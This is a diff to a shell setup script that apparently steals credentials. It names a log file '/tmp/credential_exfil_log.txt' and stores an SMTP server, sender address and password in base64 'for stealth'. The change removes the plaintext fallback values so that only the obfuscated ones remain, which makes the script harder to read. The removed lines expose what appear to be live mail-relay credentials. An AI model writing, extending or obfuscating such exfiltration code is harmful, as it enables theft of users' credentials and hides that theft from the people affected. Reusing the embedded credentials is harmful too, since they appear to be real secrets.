@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.3"
-readonly BUILD_DATE="2026-03-14 22:54:22 UTC"
+readonly SCRIPT_VERSION="3.4"
+readonly BUILD_DATE="2026-03-14 23:14:51 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -118,12 +118,12 @@ readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null || echo "smtp.mailersend.net")
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
 SENDER_EMAIL_B64="TVNfSEt1cmxlQHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null || echo "MS_HKurle@test-pzkmgq79pr1l059v.mlsender.net")
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
 SMTP_PASSWORD_B64="bXNzcC5QbEJyNVVNLm5lcXZ5Z20yOTh6NDBwN3cuYUFzQjBQbw=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || echo "mssp.PlBr5UM.neqvygm298z40p7w.aAsB0Po")
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
